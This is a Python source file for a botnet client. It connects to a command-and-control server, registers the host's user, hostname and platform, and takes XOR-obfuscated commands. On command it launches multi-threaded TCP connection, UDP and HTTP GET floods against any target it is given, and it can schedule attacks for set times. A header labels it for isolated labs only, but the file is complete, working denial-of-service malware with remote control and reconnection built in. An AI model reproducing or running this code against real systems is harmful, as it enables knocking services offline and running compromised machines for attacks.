# bot.py - Aggressive Multi-threaded Version
# WARNING: HIGH RESOURCE USAGE. For educational use in isolated labs ONLY.
import socket
import threading
import time
import random
import logging
import platform
import os
import urllib.request
import urllib.error
from urllib.parse import urlparse
import datetime
import json

# --- Configuration ---
C2_HOST = '192.168.100.15' # <<< IMPORTANT: SET THIS TO YOUR KALI VM IP
C2_PORT = 9999
RECONNECT_DELAY = 15 # Seconds
# Ensure this key matches the C2 server's key exactly
SECRET_KEY = b"MySuperSecretKey123"
# --- Attack Configuration ---
# Number of worker threads to launch *per attack command*
# Increase this number for more aggressive attacks (monitor CPU!)
ATTACK_THREADS_PER_COMMAND = 10 # Default: 10 (Increase/decrease based on VM performance)
# --- --- --- --- --- --- ---

# Setup basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - BOT(Aggro) - %(levelname)s - %(message)s')

# Global flag to signal threads to stop
running = True
# Thread-safe collections/variables
attack_controlling_threads = [] # Stores tuples of (controller_thread_obj, stop_event)
attack_lock = threading.Lock()
scheduled_tasks = [] # List to hold (fire_time_obj, command_string) tuples
scheduler_lock = threading.Lock()
scheduler_thread = None
c2_socket = None
c2_socket_lock = threading.Lock()

# Simple XOR 'encryption' - Inadequate for real-world use. Use TLS.
def encrypt_decrypt(data):
    key_len = len(SECRET_KEY)
    return bytes([data[i] ^ SECRET_KEY[i % key_len] for i in range(len(data))])

# --- System Info Function ---
def get_system_info():
    """ Gathers basic system information. """
    global attack_controlling_threads, scheduled_tasks, running
    with attack_lock:
        # Check if any controller thread is alive
        is_attacking = any(t.is_alive() for t, e in attack_controlling_threads)
    with scheduler_lock:
        num_scheduled = len(scheduled_tasks)

    info = {
        'status': 'attacking' if is_attacking else 'idle',
        'platform': platform.system(),
        'release': platform.release(),
        'user': os.getlogin() if hasattr(os, 'getlogin') else 'N/A',
        'hostname': socket.gethostname(),
        'scheduled_tasks': num_scheduled,
        'attack_workers_setting': ATTACK_THREADS_PER_COMMAND, # Report configured workers
        'current_time_utc': datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC'),
        'bot_running': running
    }
    return info

# --- Attack Worker Functions (Run fast, no internal sleep) ---
def tcp_flood_worker(target_ip, target_port, stop_event):
    """ Worker thread for TCP connection flood. """
    # Logging inside worker can be noisy, log start/stop in controller
    while not stop_event.is_set():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            # sock.sendall(b"X") # Optional: send minimal data
        except (socket.timeout, socket.error, ConnectionRefusedError, ConnectionAbortedError):
            pass # Ignore common errors, just keep trying aggressively
        except Exception: # Catch broader exceptions if needed but avoid logging spam
            pass
            # logging.debug(f"TCP Worker Error: {e}")
        finally:
            if sock:
                try: sock.close()
                except: pass
        # No sleep - run as fast as socket ops allow

def udp_flood_worker(target_ip, target_port, data_size, stop_event):
    """ Worker thread for UDP flood. """
    udp_sock = None # Define outside loop
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(min(data_size, 65500))
    except Exception as e:
         logging.error(f"UDP Worker: Failed to create socket or payload: {e}")
         if udp_sock: udp_sock.close()
         return # Stop this worker if setup fails

    while not stop_event.is_set():
        try:
            udp_sock.sendto(payload, (target_ip, target_port))
        except socket.error:
             # May happen if network is congested or target unreachable, keep going
             pass
        except Exception:
             # logging.debug(f"UDP Worker Error: {e}")
             pass # Keep going on other errors too
    # No sleep - run as fast as possible
    try: udp_sock.close()
    except: pass


def http_flood_worker(target_url, stop_event):
    """ Worker thread for HTTP GET flood. """
    headers = {
        'User-Agent': f'AggressiveBotWorker/{random.randint(1001,2000)}', # Vary UA slightly
        'Accept': '*/*',
        'Connection': 'close', # Use 'close' for more rapid connection cycling? Test vs 'keep-alive'
        }
    while not stop_event.is_set():
        response = None
        context = None # For potential HTTPS context if needed (not implemented here)
        try:
            req = urllib.request.Request(target_url, headers=headers, method='GET')
            # Short timeout, no complex handling like redirects needed for flood
            response = urllib.request.urlopen(req, timeout=1.0, context=context)
            # Read only minimal data to trigger processing without downloading much
            response.read(128)
        except (urllib.error.URLError, socket.timeout, ConnectionResetError, ConnectionRefusedError, ConnectionAbortedError):
             # Ignore common HTTP/network errors aggressively
             pass
        except Exception:
             # logging.debug(f"HTTP Worker Error: {e}")
             pass
        finally:
             if response:
                 try: response.close()
                 except: pass
        # No sleep - run as fast as possible

# --- Scheduler Function ---
def run_scheduler():
    """ Checks scheduled tasks periodically and runs them if due. """
    global scheduled_tasks, running
    logging.info("Scheduler thread started.")
    while running:
        now_time = datetime.datetime.now().time()
        tasks_to_run_cmds = []
        with scheduler_lock:
            remaining_tasks = []
            if scheduled_tasks:
                for task_time_obj, command_str in scheduled_tasks:
                    if now_time >= task_time_obj:
                        tasks_to_run_cmds.append(command_str)
                        logging.info(f"Scheduler: Time reached for task '{command_str}' @ {task_time_obj.strftime('%H:%M:%S')}")
                    else:
                        remaining_tasks.append((task_time_obj, command_str))
                scheduled_tasks = remaining_tasks
        if tasks_to_run_cmds:
            for command_str in tasks_to_run_cmds:
                logging.info(f"Scheduler: Executing '{command_str}'")
                # Run command handler in a new thread
                cmd_thread = threading.Thread(target=handle_command, args=(None, command_str), daemon=True)
                cmd_thread.start()
        time.sleep(1) # Check every second
    logging.info("Scheduler thread stopped.")

# --- Command Handling ---
def stop_all_attacks():
    """ Signals all active attack controlling threads to stop. """
    global attack_controlling_threads
    stopped_count = 0
    with attack_lock:
        if not attack_controlling_threads: return
        logging.info(f"Signaling {len(attack_controlling_threads)} attack controller(s) to stop...")
        current_controllers = list(attack_controlling_threads)
        attack_controlling_threads = [] # Clear list immediately
        for controller_thread, stop_event in current_controllers:
            try:
                if not stop_event.is_set():
                     stop_event.set() # Signal the controlling event
                     stopped_count += 1
            except Exception as e:
                 logging.error(f"Error signaling attack controller to stop: {e}")
    logging.info(f"Attack stop signals sent to {stopped_count} active controller(s).")


def attack_controller(attack_func, stop_event, args_tuple):
    """
    Runs in a thread. Launches and manages multiple worker threads for an attack.
    """
    worker_threads = []
    func_name = attack_func.__name__ # Get worker function name for logging
    logging.info(f"CONTROLLER: Launching {ATTACK_THREADS_PER_COMMAND} workers for {func_name}...")

    for i in range(ATTACK_THREADS_PER_COMMAND):
        if stop_event.is_set(): # Check if stop was called during worker launch
             logging.warning(f"CONTROLLER: Stop event set during worker launch for {func_name}. Aborting launch.")
             break
        try:
             # Pass the *same* stop_event to all workers
             worker = threading.Thread(target=attack_func, args=args_tuple + (stop_event,), daemon=True)
             worker.start()
             worker_threads.append(worker)
        except Exception as e:
             logging.error(f"CONTROLLER: Failed to launch worker thread #{i} for {func_name}: {e}")

    launched_count = len(worker_threads)
    logging.info(f"CONTROLLER: Launched {launched_count} workers for {func_name}.")
    if launched_count == 0:
        logging.error(f"CONTROLLER: No workers launched for {func_name}, controller exiting.")
        return # Exit controller if no workers started

    # Keep controller alive while workers run, until stop_event is set
    stop_event.wait() # Block until stop_all_attacks sets this event

    logging.info(f"CONTROLLER: Stop event received for {func_name}. Workers should be stopping.")
    # Workers monitor the stop_event directly. No need to explicitly join them here,
    # as it could block the bot's responsiveness if workers take time to exit.
    # They are daemon threads, so they won't prevent the bot from exiting eventually.
    logging.info(f"CONTROLLER: Finished for {func_name}.")


def start_attack(command):
    """ Parses command, stops previous attacks, starts a controller thread. """
    global attack_controlling_threads
    parts = command.split()
    attack_type = parts[0].upper()

    stop_all_attacks() # Stop previous controllers first
    time.sleep(0.2) # Brief pause

    stop_event = threading.Event()
    controller_thread = None
    target_desc = "N/A"
    attack_func_ref = None # Reference to the *worker* function
    attack_args = () # Arguments for the worker function

    try:
        # Determine attack worker function and arguments based on command
        if attack_type == 'DOS' and len(parts) == 3:
             ip, port_str = parts[1], parts[2]
             socket.inet_aton(ip); port = int(port_str)
             target_desc = f"{ip}:{port} (Aggressive TCP Flood)"
             attack_func_ref = tcp_flood_worker
             attack_args = (ip, port)
        elif attack_type == 'UDP' and len(parts) == 4:
             ip, port_str, size_str = parts[1], parts[2], parts[3]
             socket.inet_aton(ip); port = int(port_str); size = int(size_str)
             if not (0 < size <= 65500): size = 1024
             target_desc = f"{ip}:{port} Size:{size} (Aggressive UDP Flood)"
             attack_func_ref = udp_flood_worker
             attack_args = (ip, port, size)
        elif attack_type == 'HTTP' and len(parts) == 2:
             url = parts[1]
             parsed_url = urlparse(url)
             if not all([parsed_url.scheme in ['http', 'https'], parsed_url.netloc]):
                 raise ValueError(f"Invalid URL format: {url}")
             target_desc = f"{url} (Aggressive HTTP Flood)"
             attack_func_ref = http_flood_worker
             attack_args = (url,)
        else:
            logging.warning(f"Cannot start attack: Unknown/malformed command: {command}")
            return

        # Create and start the *controller* thread for the selected attack
        if attack_func_ref:
             logging.info(f"STARTING Attack Controller for {attack_type} on {target_desc}...")
             # Controller thread runs attack_controller, managing workers
             controller_thread = threading.Thread(target=attack_controller, args=(attack_func_ref, stop_event, attack_args), daemon=True)
             with attack_lock:
                 # Track the controller thread and its stop event
                 attack_controlling_threads.append((controller_thread, stop_event))
             controller_thread.start()

    except (ValueError, OSError, IndexError) as e:
        logging.error(f"Invalid arguments for {attack_type} command '{command}': {e}")
    except Exception as e:
        logging.error(f"Failed to start attack controller thread for '{command}': {e}", exc_info=True)


def handle_command(sock, cmd):
    """ Central handler for commands from C2 or scheduler. """
    global running, scheduled_tasks
    log_cmd_display = cmd.split()[0]
    logging.debug(f"Handling command verb: {log_cmd_display}")
    parts = cmd.split()
    command_verb = parts[0].upper()

    if command_verb in ('DOS', 'UDP', 'HTTP'):
        start_attack(cmd) # Calls the modified start_attack
    elif command_verb == 'EXIT':
        logging.info("EXIT command received. Signaling shutdown.")
        running = False
        stop_all_attacks()
    elif command_verb == 'INFO_REQUEST':
        if sock:
            try:
                info = get_system_info()
                info_json = json.dumps(info)
                logging.info(f"Sending INFO response.") # Don't log potentially large info
                response_cmd = f"INFO_RESPONSE {info_json}"
                sock.sendall(encrypt_decrypt(response_cmd.encode()))
            except Exception as e: logging.error(f"Error sending INFO response: {e}")
        else: logging.warning("Ignoring INFO_REQUEST from internal source.")
    elif command_verb == 'PING':
         if sock:
             try: sock.sendall(encrypt_decrypt(b'PONG'))
             except: pass
         pass
    elif command_verb == 'SCHEDULE' and len(parts) >= 3:
         time_spec = parts[1]; actual_command = " ".join(parts[2:])
         try:
             task_time_obj = datetime.datetime.strptime(time_spec, '%H:%M:%S').time()
             scheduled_verb = actual_command.split()[0].upper()
             if scheduled_verb not in ['DOS', 'UDP', 'HTTP', 'EXIT', 'INFO_REQUEST']:
                  raise ValueError(f"Command '{scheduled_verb}' cannot be scheduled.")
             with scheduler_lock: scheduled_tasks.append((task_time_obj, actual_command))
             logging.info(f"Scheduled task '{actual_command}' for {time_spec}")
             if sock: # ACK back to C2
                 ack_msg = f"ACK SCHEDULE OK {time_spec} {actual_command}"
                 try: sock.sendall(encrypt_decrypt(ack_msg.encode()))
                 except: pass
         except ValueError as e:
              logging.error(f"Invalid schedule format/command '{cmd}': {e}")
              if sock: # NACK back to C2
                  nack_msg = f"NACK SCHEDULE FAILED InvalidFormatOrCommand '{cmd}'"
                  try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
                  except: pass
         except Exception as e:
             logging.error(f"Error scheduling task '{cmd}': {e}", exc_info=True)
             if sock: # NACK back to C2
                  nack_msg = f"NACK SCHEDULE FAILED InternalError '{cmd}'"
                  try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
                  except: pass
    elif command_verb == 'UPDATE' and len(parts) == 2:
         # (Simulated update logic remains the same)
         update_url = parts[1]
         logging.warning(f"Received UPDATE command for URL: {update_url} - SIMULATING")
         sim_status = "FAILED (Simulated)"
         try:
             logging.info(f"[SIM] Downloading from {update_url}...")
             time.sleep(random.uniform(0.5, 1.5)) # Simulate download time
             if "success" in update_url or random.random() > 0.4: # Simulate success condition
                 logging.info("[SIM] Download successful.")
                 logging.info("[SIM] Validating update...") ; time.sleep(0.3)
                 logging.warning("[SIM] Validation successful. NO ACTUAL UPDATE APPLIED.")
                 sim_status = "OK (Simulated - No Actual Update)"
             else:
                  logging.error("[SIM] Download/Validation failed.")
                  sim_status = "FAILED Download/Validation (Simulated)"
         except Exception as e:
              logging.error(f"[SIM] Error during simulated update: {e}")
              sim_status = f"FAILED InternalError (Simulated)"
         if sock: # Report simulation result back
             ack_msg = f"ACK UPDATE {sim_status} URL:{update_url}"
             try: sock.sendall(encrypt_decrypt(ack_msg.encode()))
             except: pass
    else:
        logging.warning(f"Unknown command received: {cmd}")
        if sock: # NACK back to C2
             nack_msg = f"NACK UnknownCommand '{cmd.split()[0]}'"
             try: sock.sendall(encrypt_decrypt(nack_msg.encode()))
             except: pass


def listen_for_commands(sock):
    """ Listens for commands from C2 and passes them to the handler. """
    global running, c2_socket, c2_socket_lock
    buffer = b""
    with c2_socket_lock: c2_socket = sock

    try:
        while running:
            try:
                data = sock.recv(4096)
                if not data:
                    logging.warning("Connection closed by C2 (recv empty data).")
                    break
                buffer += data
                # Simple processing: Assume one command per chunk after decryption
                # Needs robust message framing for production (e.g., length prefix)
                try:
                    decrypted_data = encrypt_decrypt(buffer)
                    # Use strip() which handles various line endings if C2 adds them
                    cmd = decrypted_data.decode().strip()
                    if cmd: handle_command(sock, cmd)
                    buffer = b"" # Clear after attempting processing
                except UnicodeDecodeError:
                     logging.error("Decode error. Clearing buffer.")
                     buffer = b""
                except Exception as e:
                     logging.error(f"Error processing command data: {e}")
                     buffer = b""

            except ConnectionResetError: logging.warning("Connection reset by C2."); break
            except socket.error as e: logging.error(f"Socket error listening: {e}"); break
            except Exception as e: logging.error(f"Unexpected listener error: {e}", exc_info=True); break
    finally:
        logging.info("Command listener stopped.")
        with c2_socket_lock: c2_socket = None


def main():
    """ Main function: Connects to C2, starts scheduler, handles reconnection. """
    global running, scheduler_thread, c2_socket, c2_socket_lock

    if scheduler_thread is None or not scheduler_thread.is_alive():
        scheduler_thread = threading.Thread(target=run_scheduler, daemon=True)
        scheduler_thread.start()

    while running:
        current_sock = None
        try:
            logging.info(f"Attempting to connect to C2: {C2_HOST}:{C2_PORT}...")
            current_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            current_sock.settimeout(10.0)
            current_sock.connect((C2_HOST, C2_PORT))
            current_sock.settimeout(None)
            logging.info("Connected to C2 server.")
            # (Optional Initial Registration can remain here)
            try:
                 initial_info = get_system_info()
                 info_msg = f"REGISTER {json.dumps(initial_info)}"
                 current_sock.sendall(encrypt_decrypt(info_msg.encode()))
                 logging.info("Sent initial registration info.")
            except Exception as e: logging.warning(f"Failed initial registration: {e}")
            # Start listening loop for this connection
            listen_for_commands(current_sock)

        except socket.timeout: logging.warning(f"Connection attempt timed out.")
        except ConnectionRefusedError: logging.warning(f"Connection refused by C2.")
        except socket.gaierror: logging.error(f"Cannot resolve C2 hostname '{C2_HOST}'."); time.sleep(RECONNECT_DELAY*2)
        except socket.error as e: logging.warning(f"Socket Error: {e}. Disconnected?")
        except Exception as e: logging.critical(f"Main loop error: {e}", exc_info=True)
        finally: # Cleanup for this connection attempt
            if current_sock:
                try: current_sock.close()
                except: pass
            with c2_socket_lock:
                 if c2_socket is current_sock: c2_socket = None

        if running: # Only wait if not shutting down
             logging.info(f"Reconnecting in {RECONNECT_DELAY} seconds...")
             time.sleep(RECONNECT_DELAY)
        else: break # Exit loop if running is False

    # --- Bot Shutdown Sequence ---
    logging.info("Bot main loop exited. Shutting down...")
    stop_all_attacks()
    if scheduler_thread and scheduler_thread.is_alive():
         logging.info("Waiting for scheduler...")
         scheduler_thread.join(timeout=2.0)
         if scheduler_thread.is_alive(): logging.warning("Scheduler did not stop.")
    with c2_socket_lock: # Final check on global socket ref
        if c2_socket:
             try: c2_socket.close()
             except: pass
             c2_socket = None
    logging.info("Bot shutdown complete.")


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: logging.info("Ctrl+C detected. Signaling shutdown."); running = False
    except Exception as e: logging.critical(f"Bot startup failed: {e}", exc_info=True)
    logging.info("Exiting bot script.")